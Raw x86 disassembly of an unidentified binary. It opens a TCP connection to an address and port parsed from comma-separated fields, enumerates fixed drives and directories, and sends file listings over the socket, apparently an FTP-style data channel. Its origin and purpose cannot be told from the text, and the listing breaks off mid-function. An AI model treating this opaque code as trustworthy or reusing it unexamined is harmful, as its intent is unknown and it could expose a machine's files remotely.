131433d7:	8d 86 12 07 00 00    	lea    0x712(%esi),%eax
131433dd:	50                   	push   %eax
131433de:	8d 45 d8             	lea    -0x28(%ebp),%eax
131433e1:	68 98 ed 14 13       	push   $0x1314ed98
131433e6:	50                   	push   %eax
131433e7:	ff 15 98 39 15 13    	call   *0x13153998
131433ed:	8d 86 82 07 00 00    	lea    0x782(%esi),%eax
131433f3:	50                   	push   %eax
131433f4:	e8 0f f4 ff ff       	call   0x13142808
131433f9:	33 db                	xor    %ebx,%ebx
131433fb:	8a f8                	mov    %al,%bh
131433fd:	8d 86 9e 07 00 00    	lea    0x79e(%esi),%eax
13143403:	50                   	push   %eax
13143404:	e8 ff f3 ff ff       	call   0x13142808
13143409:	8a d8                	mov    %al,%bl
1314340b:	83 c4 20             	add    $0x20,%esp
1314340e:	8b c3                	mov    %ebx,%eax
13143410:	66 c7 45 e8 02 00    	movw   $0x2,-0x18(%ebp)
13143416:	50                   	push   %eax
13143417:	ff 15 8c 37 15 13    	call   *0x1315378c
1314341d:	66 89 45 ea          	mov    %ax,-0x16(%ebp)
13143421:	8d 45 d8             	lea    -0x28(%ebp),%eax
13143424:	50                   	push   %eax
13143425:	ff 15 ac 39 15 13    	call   *0x131539ac
1314342b:	89 45 ec             	mov    %eax,-0x14(%ebp)
1314342e:	8d 85 d8 f8 ff ff    	lea    -0x728(%ebp),%eax
13143434:	50                   	push   %eax
13143435:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
1314343b:	68 c4 ed 14 13       	push   $0x1314edc4
13143440:	50                   	push   %eax
13143441:	ff 15 98 39 15 13    	call   *0x13153998
13143447:	83 c4 0c             	add    $0xc,%esp
1314344a:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
13143450:	57                   	push   %edi
13143451:	50                   	push   %eax
13143452:	e8 a6 f2 ff ff       	call   0x131426fd
13143457:	59                   	pop    %ecx
13143458:	50                   	push   %eax
13143459:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
1314345f:	50                   	push   %eax
13143460:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
13143466:	ff 15 68 37 15 13    	call   *0x13153768
1314346c:	8d 45 e8             	lea    -0x18(%ebp),%eax
1314346f:	6a 10                	push   $0x10
13143471:	50                   	push   %eax
13143472:	ff 75 08             	pushl  0x8(%ebp)
13143475:	ff 15 34 37 15 13    	call   *0x13153734
1314347b:	83 f8 ff             	cmp    $0xffffffff,%eax
1314347e:	5b                   	pop    %ebx
1314347f:	75 3b                	jne    0x131434bc
13143481:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
13143487:	68 38 ed 14 13       	push   $0x1314ed38
1314348c:	50                   	push   %eax
1314348d:	ff 15 98 39 15 13    	call   *0x13153998
13143493:	59                   	pop    %ecx
13143494:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
1314349a:	59                   	pop    %ecx
1314349b:	57                   	push   %edi
1314349c:	50                   	push   %eax
1314349d:	e8 5b f2 ff ff       	call   0x131426fd
131434a2:	59                   	pop    %ecx
131434a3:	50                   	push   %eax
131434a4:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
131434aa:	50                   	push   %eax
131434ab:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
131434b1:	ff 15 68 37 15 13    	call   *0x13153768
131434b7:	e9 88 00 00 00       	jmp    0x13143544
131434bc:	39 3d 28 2c 15 13    	cmp    %edi,0x13152c28
131434c2:	74 3e                	je     0x13143502
131434c4:	57                   	push   %edi
131434c5:	8d 85 d8 f4 ff ff    	lea    -0xb28(%ebp),%eax
131434cb:	68 00 04 00 00       	push   $0x400
131434d0:	50                   	push   %eax
131434d1:	ff 75 08             	pushl  0x8(%ebp)
131434d4:	ff 15 4c 37 15 13    	call   *0x1315374c
131434da:	3b c7                	cmp    %edi,%eax
131434dc:	74 24                	je     0x13143502
131434de:	83 f8 ff             	cmp    $0xffffffff,%eax
131434e1:	74 1f                	je     0x13143502
131434e3:	8d 4d f8             	lea    -0x8(%ebp),%ecx
131434e6:	57                   	push   %edi
131434e7:	51                   	push   %ecx
131434e8:	50                   	push   %eax
131434e9:	8d 85 d8 f4 ff ff    	lea    -0xb28(%ebp),%eax
131434ef:	50                   	push   %eax
131434f0:	ff 75 fc             	pushl  -0x4(%ebp)
131434f3:	ff 15 b4 33 15 13    	call   *0x131533b4
131434f9:	85 c0                	test   %eax,%eax
131434fb:	74 05                	je     0x13143502
131434fd:	39 7d f8             	cmp    %edi,-0x8(%ebp)
13143500:	75 ba                	jne    0x131434bc
13143502:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
13143508:	68 20 ed 14 13       	push   $0x1314ed20
1314350d:	50                   	push   %eax
1314350e:	ff 15 98 39 15 13    	call   *0x13153998
13143514:	59                   	pop    %ecx
13143515:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
1314351b:	59                   	pop    %ecx
1314351c:	57                   	push   %edi
1314351d:	50                   	push   %eax
1314351e:	e8 da f1 ff ff       	call   0x131426fd
13143523:	59                   	pop    %ecx
13143524:	50                   	push   %eax
13143525:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
1314352b:	50                   	push   %eax
1314352c:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
13143532:	ff 15 68 37 15 13    	call   *0x13153768
13143538:	ff 75 fc             	pushl  -0x4(%ebp)
1314353b:	ff 15 80 33 15 13    	call   *0x13153380
13143541:	6a 01                	push   $0x1
13143543:	5f                   	pop    %edi
13143544:	ff 75 08             	pushl  0x8(%ebp)
13143547:	ff 15 e4 36 15 13    	call   *0x131536e4
1314354d:	8b c7                	mov    %edi,%eax
1314354f:	5f                   	pop    %edi
13143550:	5e                   	pop    %esi
13143551:	c9                   	leave  
13143552:	c3                   	ret    
13143553:	55                   	push   %ebp
13143554:	8b ec                	mov    %esp,%ebp
13143556:	81 ec f0 07 00 00    	sub    $0x7f0,%esp
1314355c:	56                   	push   %esi
1314355d:	57                   	push   %edi
1314355e:	be ac ee 14 13       	mov    $0x1314eeac,%esi
13143563:	8d 7d d8             	lea    -0x28(%ebp),%edi
13143566:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13143567:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13143568:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
1314356a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1314356b:	33 ff                	xor    %edi,%edi
1314356d:	57                   	push   %edi
1314356e:	6a 01                	push   $0x1
13143570:	6a 02                	push   $0x2
13143572:	ff 15 64 35 15 13    	call   *0x13153564
13143578:	83 f8 ff             	cmp    $0xffffffff,%eax
1314357b:	89 45 fc             	mov    %eax,-0x4(%ebp)
1314357e:	75 07                	jne    0x13143587
13143580:	33 c0                	xor    %eax,%eax
13143582:	e9 7e 03 00 00       	jmp    0x13143905
13143587:	8b 75 08             	mov    0x8(%ebp),%esi
1314358a:	53                   	push   %ebx
1314358b:	8d 86 66 07 00 00    	lea    0x766(%esi),%eax
13143591:	50                   	push   %eax
13143592:	8d 86 4a 07 00 00    	lea    0x74a(%esi),%eax
13143598:	50                   	push   %eax
13143599:	8d 86 2e 07 00 00    	lea    0x72e(%esi),%eax
1314359f:	50                   	push   %eax
131435a0:	8d 86 12 07 00 00    	lea    0x712(%esi),%eax
131435a6:	50                   	push   %eax
131435a7:	8d 45 b0             	lea    -0x50(%ebp),%eax
131435aa:	68 98 ed 14 13       	push   $0x1314ed98
131435af:	50                   	push   %eax
131435b0:	ff 15 98 39 15 13    	call   *0x13153998
131435b6:	8d 86 82 07 00 00    	lea    0x782(%esi),%eax
131435bc:	50                   	push   %eax
131435bd:	e8 46 f2 ff ff       	call   0x13142808
131435c2:	33 db                	xor    %ebx,%ebx
131435c4:	8a f8                	mov    %al,%bh
131435c6:	8d 86 9e 07 00 00    	lea    0x79e(%esi),%eax
131435cc:	50                   	push   %eax
131435cd:	e8 36 f2 ff ff       	call   0x13142808
131435d2:	8a d8                	mov    %al,%bl
131435d4:	83 c4 20             	add    $0x20,%esp
131435d7:	8b c3                	mov    %ebx,%eax
131435d9:	66 c7 45 c0 02 00    	movw   $0x2,-0x40(%ebp)
131435df:	50                   	push   %eax
131435e0:	ff 15 8c 37 15 13    	call   *0x1315378c
131435e6:	66 89 45 c2          	mov    %ax,-0x3e(%ebp)
131435ea:	8d 45 b0             	lea    -0x50(%ebp),%eax
131435ed:	50                   	push   %eax
131435ee:	ff 15 ac 39 15 13    	call   *0x131539ac
131435f4:	89 45 c4             	mov    %eax,-0x3c(%ebp)
131435f7:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131435fd:	68 74 ee 14 13       	push   $0x1314ee74
13143602:	50                   	push   %eax
13143603:	ff 15 98 39 15 13    	call   *0x13153998
13143609:	59                   	pop    %ecx
1314360a:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
13143610:	59                   	pop    %ecx
13143611:	57                   	push   %edi
13143612:	50                   	push   %eax
13143613:	e8 e5 f0 ff ff       	call   0x131426fd
13143618:	59                   	pop    %ecx
13143619:	50                   	push   %eax
1314361a:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
13143620:	50                   	push   %eax
13143621:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
13143627:	ff 15 68 37 15 13    	call   *0x13153768
1314362d:	8d 45 c0             	lea    -0x40(%ebp),%eax
13143630:	6a 10                	push   $0x10
13143632:	50                   	push   %eax
13143633:	ff 75 fc             	pushl  -0x4(%ebp)
13143636:	ff 15 34 37 15 13    	call   *0x13153734
1314363c:	83 f8 ff             	cmp    $0xffffffff,%eax
1314363f:	75 19                	jne    0x1314365a
13143641:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
13143647:	68 38 ed 14 13       	push   $0x1314ed38
1314364c:	50                   	push   %eax
1314364d:	ff 15 98 39 15 13    	call   *0x13153998
13143653:	59                   	pop    %ecx
13143654:	59                   	pop    %ecx
13143655:	e9 7c 02 00 00       	jmp    0x131438d6
1314365a:	8d be 12 03 00 00    	lea    0x312(%esi),%edi
13143660:	57                   	push   %edi
13143661:	e8 97 f0 ff ff       	call   0x131426fd
13143666:	83 f8 01             	cmp    $0x1,%eax
13143669:	59                   	pop    %ecx
1314366a:	75 66                	jne    0x131436d2
1314366c:	6a 41                	push   $0x41
1314366e:	5f                   	pop    %edi
1314366f:	57                   	push   %edi
13143670:	8d 45 d0             	lea    -0x30(%ebp),%eax
13143673:	68 6c ee 14 13       	push   $0x1314ee6c
13143678:	50                   	push   %eax
13143679:	ff 15 98 39 15 13    	call   *0x13153998
1314367f:	83 c4 0c             	add    $0xc,%esp
13143682:	8d 45 d0             	lea    -0x30(%ebp),%eax
13143685:	50                   	push   %eax
13143686:	ff 15 b8 36 15 13    	call   *0x131536b8
1314368c:	83 f8 03             	cmp    $0x3,%eax
1314368f:	75 36                	jne    0x131436c7
13143691:	57                   	push   %edi
13143692:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
13143698:	68 40 ee 14 13       	push   $0x1314ee40
1314369d:	50                   	push   %eax
1314369e:	ff 15 98 39 15 13    	call   *0x13153998
131436a4:	83 c4 0c             	add    $0xc,%esp
131436a7:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131436ad:	6a 00                	push   $0x0
131436af:	50                   	push   %eax
131436b0:	e8 48 f0 ff ff       	call   0x131426fd
131436b5:	59                   	pop    %ecx
131436b6:	50                   	push   %eax
131436b7:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131436bd:	50                   	push   %eax
131436be:	ff 75 fc             	pushl  -0x4(%ebp)
131436c1:	ff 15 68 37 15 13    	call   *0x13153768
131436c7:	47                   	inc    %edi
131436c8:	83 ff 5a             	cmp    $0x5a,%edi
131436cb:	7e a2                	jle    0x1314366f
131436cd:	e9 ed 01 00 00       	jmp    0x131438bf
131436d2:	8d 85 10 f8 ff ff    	lea    -0x7f0(%ebp),%eax
131436d8:	50                   	push   %eax
131436d9:	57                   	push   %edi
131436da:	e8 78 f7 ff ff       	call   0x13142e57
131436df:	8d 85 10 f8 ff ff    	lea    -0x7f0(%ebp),%eax
131436e5:	68 38 ee 14 13       	push   $0x1314ee38
131436ea:	50                   	push   %eax
131436eb:	e8 82 f0 ff ff       	call   0x13142772
131436f0:	83 c4 10             	add    $0x10,%esp
131436f3:	8d 85 10 fe ff ff    	lea    -0x1f0(%ebp),%eax
131436f9:	50                   	push   %eax
131436fa:	8d 85 10 f8 ff ff    	lea    -0x7f0(%ebp),%eax
13143700:	50                   	push   %eax
13143701:	ff 15 b8 33 15 13    	call   *0x131533b8
13143707:	83 f8 ff             	cmp    $0xffffffff,%eax
1314370a:	89 45 08             	mov    %eax,0x8(%ebp)
1314370d:	0f 84 ac 01 00 00    	je     0x131438bf
13143713:	85 c0                	test   %eax,%eax
13143715:	0f 84 a4 01 00 00    	je     0x131438bf
1314371b:	8b 85 10 fe ff ff    	mov    -0x1f0(%ebp),%eax
13143721:	24 10                	and    $0x10,%al
13143723:	f6 d8                	neg    %al
13143725:	1a c0                	sbb    %al,%al
13143727:	24 37                	and    $0x37,%al
13143729:	04 2d                	add    $0x2d,%al
1314372b:	88 45 d8             	mov    %al,-0x28(%ebp)
1314372e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13143731:	50                   	push   %eax
13143732:	8d 85 24 fe ff ff    	lea    -0x1dc(%ebp),%eax
13143738:	50                   	push   %eax
13143739:	ff 15 a4 33 15 13    	call   *0x131533a4
1314373f:	8d 45 ec             	lea    -0x14(%ebp),%eax
13143742:	50                   	push   %eax
13143743:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13143746:	50                   	push   %eax
13143747:	ff 15 94 33 15 13    	call   *0x13153394
1314374d:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
13143751:	50                   	push   %eax
13143752:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
13143756:	50                   	push   %eax
13143757:	8d 45 90             	lea    -0x70(%ebp),%eax
1314375a:	68 30 ee 14 13       	push   $0x1314ee30
1314375f:	50                   	push   %eax
13143760:	ff 15 98 39 15 13    	call   *0x13153998
13143766:	0f b7 45 f2          	movzwl -0xe(%ebp),%eax
1314376a:	50                   	push   %eax
1314376b:	bf 28 ee 14 13       	mov    $0x1314ee28,%edi
13143770:	0f b7 45 ee          	movzwl -0x12(%ebp),%eax
13143774:	ff 34 85 a4 ec 14 13 	pushl  0x1314eca4(,%eax,4)
1314377b:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
13143781:	57                   	push   %edi
13143782:	50                   	push   %eax
13143783:	ff 15 98 39 15 13    	call   *0x13153998
13143789:	8d 85 3c fe ff ff    	lea    -0x1c4(%ebp),%eax
1314378f:	bb 08 ee 14 13       	mov    $0x1314ee08,%ebx
13143794:	50                   	push   %eax
13143795:	8d 45 90             	lea    -0x70(%ebp),%eax
13143798:	50                   	push   %eax
13143799:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
1314379f:	50                   	push   %eax
131437a0:	8d 45 d8             	lea    -0x28(%ebp),%eax
131437a3:	ff b5 30 fe ff ff    	pushl  -0x1d0(%ebp)
131437a9:	50                   	push   %eax
131437aa:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131437b0:	53                   	push   %ebx
131437b1:	50                   	push   %eax
131437b2:	ff 15 98 39 15 13    	call   *0x13153998
131437b8:	83 c4 3c             	add    $0x3c,%esp
131437bb:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131437c1:	6a 00                	push   $0x0
131437c3:	50                   	push   %eax
131437c4:	e8 34 ef ff ff       	call   0x131426fd
131437c9:	59                   	pop    %ecx
131437ca:	50                   	push   %eax
131437cb:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131437d1:	50                   	push   %eax
131437d2:	ff 75 fc             	pushl  -0x4(%ebp)
131437d5:	ff 15 68 37 15 13    	call   *0x13153768
131437db:	8d 85 10 fe ff ff    	lea    -0x1f0(%ebp),%eax
131437e1:	50                   	push   %eax
131437e2:	ff 75 08             	pushl  0x8(%ebp)
131437e5:	ff 15 0c 37 15 13    	call   *0x1315370c
131437eb:	85 c0                	test   %eax,%eax
131437ed:	0f 84 cc 00 00 00    	je     0x131438bf
131437f3:	83 3d 28 2c 15 13 00 	cmpl   $0x0,0x13152c28
131437fa:	0f 84 bf 00 00 00    	je     0x131438bf
13143800:	8b 85 10 fe ff ff    	mov    -0x1f0(%ebp),%eax
13143806:	24 10                	and    $0x10,%al
13143808:	f6 d8                	neg    %al
1314380a:	1a c0                	sbb    %al,%al
1314380c:	24 37                	and    $0x37,%al
1314380e:	04 2d                	add    $0x2d,%al
13143810:	88 45 d8             	mov    %al,-0x28(%ebp)
13143813:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13143816:	50                   	push   %eax
13143817:	8d 85 24 fe ff ff    	lea    -0x1dc(%ebp),%eax
1314381d:	50                   	push   %eax
1314381e:	ff 15 a4 33 15 13    	call   *0x131533a4
13143824:	8d 45 ec             	lea    -0x14(%ebp),%eax
13143827:	50                   	push   %eax
13143828:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1314382b:	50                   	push   %eax
1314382c:	ff 15 94 33 15 13    	call   *0x13153394
13143832:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
13143836:	50                   	push   %eax
13143837:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
1314383b:	50                   	push   %eax
1314383c:	8d 45 90             	lea    -0x70(%ebp),%eax
1314383f:	68 30 ee 14 13       	push   $0x1314ee30
13143844:	50                   	push   %eax
13143845:	ff 15 98 39 15 13    	call   *0x13153998
1314384b:	0f b7 45 f2          	movzwl -0xe(%ebp),%eax
1314384f:	50                   	push   %eax
13143850:	0f b7 45 ee          	movzwl -0x12(%ebp),%eax
13143854:	ff 34 85 a4 ec 14 13 	pushl  0x1314eca4(,%eax,4)
1314385b:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
13143861:	57                   	push   %edi
13143862:	50                   	push   %eax
13143863:	ff 15 98 39 15 13    	call   *0x13153998
13143869:	8d 85 3c fe ff ff    	lea    -0x1c4(%ebp),%eax
1314386f:	50                   	push   %eax
13143870:	8d 45 90             	lea    -0x70(%ebp),%eax
13143873:	50                   	push   %eax
13143874:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
1314387a:	50                   	push   %eax
1314387b:	8d 45 d8             	lea    -0x28(%ebp),%eax
1314387e:	ff b5 30 fe ff ff    	pushl  -0x1d0(%ebp)
13143884:	50                   	push   %eax
13143885:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
1314388b:	53                   	push   %ebx
1314388c:	50                   	push   %eax
1314388d:	ff 15 98 39 15 13    	call   *0x13153998
13143893:	83 c4 3c             	add    $0x3c,%esp
13143896:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
1314389c:	6a 00                	push   $0x0
1314389e:	50                   	push   %eax
1314389f:	e8 59 ee ff ff       	call   0x131426fd
131438a4:	59                   	pop    %ecx
131438a5:	50                   	push   %eax
131438a6:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131438ac:	50                   	push   %eax
131438ad:	ff 75 fc             	pushl  -0x4(%ebp)
131438b0:	ff 15 68 37 15 13    	call   *0x13153768
131438b6:	83 f8 ff             	cmp    $0xffffffff,%eax
131438b9:	0f 85 1c ff ff ff    	jne    0x131437db
131438bf:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131438c5:	68 20 ed 14 13       	push   $0x1314ed20
131438ca:	50                   	push   %eax
131438cb:	ff 15 98 39 15 13    	call   *0x13153998
131438d1:	59                   	pop    %ecx
131438d2:	59                   	pop    %ecx
131438d3:	6a 01                	push   $0x1
131438d5:	5f                   	pop    %edi
131438d6:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131438dc:	6a 00                	push   $0x0
131438de:	50                   	push   %eax
131438df:	e8 19 ee ff ff       	call   0x131426fd
131438e4:	59                   	pop    %ecx
131438e5:	50                   	push   %eax
131438e6:	8d 85 10 fc ff ff    	lea    -0x3f0(%ebp),%eax
131438ec:	50                   	push   %eax
131438ed:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
131438f3:	ff 15 68 37 15 13    	call   *0x13153768
131438f9:	ff 75 fc             	pushl  -0x4(%ebp)
131438fc:	ff 15 e4 36 15 13    	call   *0x131536e4
13143902:	8b c7                	mov    %edi,%eax
13143904:	5b                   	pop    %ebx
13143905:	5f                   	pop    %edi
13143906:	5e                   	pop    %esi
13143907:	c9                   	leave  
13143908:	c3                   	ret    
13143909:	55                   	push   %ebp
1314390a:	8b ec                	mov    %esp,%ebp
1314390c:	8b 45 08             	mov    0x8(%ebp),%eax
1314390f:	53                   	push   %ebx
13143910:	56                   	push   %esi
13143911:	57                   	push   %edi
13143912:	8b 7d 0c             	mov    0xc(%ebp),%edi
13143915:	6a 1c                	push   $0x1c
13143917:	6a 00                	push   $0x0
13143919:	57                   	push   %edi
1314391a:	8d 70 05             	lea    0x5(%eax),%esi
1314391d:	e8 00 ed ff ff       	call   0x13142622
13143922:	8a 06                	mov    (%esi),%al
13143924:	83 c4 0c             	add    $0xc,%esp
13143927:	b3 2c                	mov    $0x2c,%bl
13143929:	3a c3                	cmp    %bl,%al
1314392b:	74 09                	je     0x13143936
1314392d:	88 07                	mov    %al,(%edi)
1314392f:	8a 46 01             	mov    0x1(%esi),%al
13143932:	47                   	inc    %edi
13143933:	46                   	inc    %esi
13143934:	eb f3                	jmp    0x13143929
13143936:	8b 7d 10             	mov    0x10(%ebp),%edi
13143939:	6a 1c                	push   $0x1c
1314393b:	6a 00                	push   $0x0
1314393d:	57                   	push   %edi
1314393e:	46                   	inc    %esi
1314393f:	e8 de ec ff ff       	call   0x13142622
13143944:	83 c4 0c             	add    $0xc,%esp
13143947:	8a 06                	mov    (%esi),%al
13143949:	3a c3                	cmp    %bl,%al
1314394b:	74 06                	je     0x13143953
1314394d:	88 07                	mov    %al,(%edi)
1314394f:	47                   	inc    %edi
13143950:	46                   	inc    %esi
13143951:	eb f4                	jmp    0x13143947
13143953:	8b 7d 14             	mov    0x14(%ebp),%edi
13143956:	6a 1c                	push   $0x1c
13143958:	6a 00                	push   $0x0
1314395a:	57                   	push   %edi
1314395b:	46                   	inc    %esi
1314395c:	e8 c1 ec ff ff       	call   0x13142622
13143961:	83 c4 0c             	add    $0xc,%esp
13143964:	8a 06                	mov    (%esi),%al
13143966:	3a c3                	cmp    %bl,%al
13143968:	74 06                	je     0x13143970
1314396a:	88 07                	mov    %al,(%edi)
1314396c:	47                   	inc    %edi
1314396d:	46                   	inc    %esi
1314396e:	eb f4                	jmp    0x13143964
13143970:	8b 7d 18             	mov    0x18(%ebp),%edi
13143973:	6a 1c                	push   $0x1c
13143975:	6a 00                	push   $0x0
13143977:	57                   	push   %edi
13143978:	46                   	inc    %esi
13143979:	e8 a4 ec ff ff       	call   0x13142622
1314397e:	83 c4 0c             	add    $0xc,%esp
13143981:	8a 06                	mov    (%esi),%al
13143983:	3a c3                	cmp    %bl,%al
13143985:	74 06                	je     0x1314398d
13143987:	88 07                	mov    %al,(%edi)
13143989:	47                   	inc    %edi
1314398a:	46                   	inc    %esi
1314398b:	eb f4                	jmp    0x13143981
1314398d:	8b 7d 1c             	mov    0x1c(%ebp),%edi
13143990:	6a 1c                	push   $0x1c
13143992:	6a 00                	push   $0x0
13143994:	57                   	push   %edi
13143995:	46                   	inc    %esi
13143996:	e8 87 ec ff ff       	call   0x13142622
1314399b:	83 c4 0c             	add    $0xc,%esp
1314399e:	8a 06                	mov    (%esi),%al
131439a0:	3a c3                	cmp    %bl,%al
131439a2:	74 06                	je     0x131439aa
131439a4:	88 07                	mov    %al,(%edi)
131439a6:	47                   	inc    %edi
131439a7:	46                   	inc    %esi
131439a8:	eb f4                	jmp    0x1314399e
131439aa:	8b 7d 20             	mov    0x20(%ebp),%edi
131439ad:	6a 1c                	push   $0x1c
131439af:	6a 00                	push   $0x0
131439b1:	57                   	push   %edi
131439b2:	46                   	inc    %esi
131439b3:	e8 6a ec ff ff       	call   0x13142622
131439b8:	83 c4 0c             	add    $0xc,%esp
131439bb:	8a 06                	mov    (%esi),%al
131439bd:	84 c0                	test   %al,%al
131439bf:	74 06                	je     0x131439c7
131439c1:	88 07                	mov    %al,(%edi)
131439c3:	47                   	inc    %edi
131439c4:	46                   	inc    %esi
131439c5:	eb f4                	jmp    0x131439bb
131439c7:	6a 01                	push   $0x1
131439c9:	58                   	pop    %eax
131439ca:	5f                   	pop    %edi
131439cb:	5e                   	pop    %esi
131439cc:	5b                   	pop    %ebx
131439cd:	5d                   	pop    %ebp
131439ce:	c3                   	ret    
131439cf:	55                   	push   %ebp
131439d0:	8b ec                	mov    %esp,%ebp
131439d2:	81 ec 40 0a 00 00    	sub    $0xa40,%esp
131439d8:	8b 45 08             	mov    0x8(%ebp),%eax
131439db:	53                   	push   %ebx
131439dc:	33 db                	xor    %ebx,%ebx
131439de:	56                   	push   %esi
131439df:	3b c3                	cmp    %ebx,%eax
131439e1:	57                   	push   %edi
131439e2:	89 85 fc fd ff ff    	mov    %eax,-0x204(%ebp)
131439e8:	0f 84 ec 07 00 00    	je     0x131441da
131439ee:	83 f8 ff             	cmp    $0xffffffff,%eax
131439f1:	0f 84 e3 07 00 00    	je     0x131441da
131439f7:	89 85 fc fd ff ff    	mov    %eax,-0x204(%ebp)
131439fd:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143a03:	68 04 f2 14 13       	push   $0x1314f204
13143a08:	50                   	push   %eax
13143a09:	c6 85 44 f6 ff ff 49 	movb   $0x49,-0x9bc(%ebp)
13143a10:	c7 85 48 f6 ff ff 01 	movl   $0x1,-0x9b8(%ebp)
13143a17:	00 00 00 
13143a1a:	89 9d 40 f6 ff ff    	mov    %ebx,-0x9c0(%ebp)
13143a20:	89 9d 4c f6 ff ff    	mov    %ebx,-0x9b4(%ebp)
13143a26:	ff 15 98 39 15 13    	call   *0x13153998
13143a2c:	59                   	pop    %ecx
13143a2d:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143a33:	59                   	pop    %ecx
13143a34:	53                   	push   %ebx
13143a35:	50                   	push   %eax
13143a36:	e8 c2 ec ff ff       	call   0x131426fd
13143a3b:	59                   	pop    %ecx
13143a3c:	50                   	push   %eax
13143a3d:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143a43:	50                   	push   %eax
13143a44:	ff b5 fc fd ff ff    	pushl  -0x204(%ebp)
13143a4a:	ff 15 68 37 15 13    	call   *0x13153768
13143a50:	8d 85 52 f9 ff ff    	lea    -0x6ae(%ebp),%eax
13143a56:	68 00 f2 14 13       	push   $0x1314f200
13143a5b:	50                   	push   %eax
13143a5c:	ff 15 98 39 15 13    	call   *0x13153998
13143a62:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
13143a68:	59                   	pop    %ecx
13143a69:	59                   	pop    %ecx
13143a6a:	0f 84 41 07 00 00    	je     0x131441b1
13143a70:	6a 05                	push   $0x5
13143a72:	bf a4 ed 14 13       	mov    $0x1314eda4,%edi
13143a77:	5e                   	pop    %esi
13143a78:	68 00 01 00 00       	push   $0x100
13143a7d:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143a83:	53                   	push   %ebx
13143a84:	50                   	push   %eax
13143a85:	e8 98 eb ff ff       	call   0x13142622
13143a8a:	68 00 01 00 00       	push   $0x100
13143a8f:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143a95:	53                   	push   %ebx
13143a96:	50                   	push   %eax
13143a97:	e8 86 eb ff ff       	call   0x13142622
13143a9c:	68 ff 00 00 00       	push   $0xff
13143aa1:	8d 85 50 f6 ff ff    	lea    -0x9b0(%ebp),%eax
13143aa7:	53                   	push   %ebx
13143aa8:	50                   	push   %eax
13143aa9:	e8 74 eb ff ff       	call   0x13142622
13143aae:	83 c4 24             	add    $0x24,%esp
13143ab1:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
13143ab7:	74 38                	je     0x13143af1
13143ab9:	8d b5 00 ff ff ff    	lea    -0x100(%ebp),%esi
13143abf:	53                   	push   %ebx
13143ac0:	6a 01                	push   $0x1
13143ac2:	56                   	push   %esi
13143ac3:	ff b5 fc fd ff ff    	pushl  -0x204(%ebp)
13143ac9:	ff 15 4c 37 15 13    	call   *0x1315374c
13143acf:	80 3e 0a             	cmpb   $0xa,(%esi)
13143ad2:	74 1a                	je     0x13143aee
13143ad4:	46                   	inc    %esi
13143ad5:	3b c3                	cmp    %ebx,%eax
13143ad7:	0f 84 eb 06 00 00    	je     0x131441c8
13143add:	83 f8 ff             	cmp    $0xffffffff,%eax
13143ae0:	0f 84 e2 06 00 00    	je     0x131441c8
13143ae6:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
13143aec:	75 d1                	jne    0x13143abf
13143aee:	6a 05                	push   $0x5
13143af0:	5e                   	pop    %esi
13143af1:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143af7:	50                   	push   %eax
13143af8:	e8 5c 19 00 00       	call   0x13145459
13143afd:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143b03:	6a 20                	push   $0x20
13143b05:	50                   	push   %eax
13143b06:	e8 90 1e 00 00       	call   0x1314599b
13143b0b:	68 80 00 00 00       	push   $0x80
13143b10:	8d 85 c0 f5 ff ff    	lea    -0xa40(%ebp),%eax
13143b16:	53                   	push   %ebx
13143b17:	50                   	push   %eax
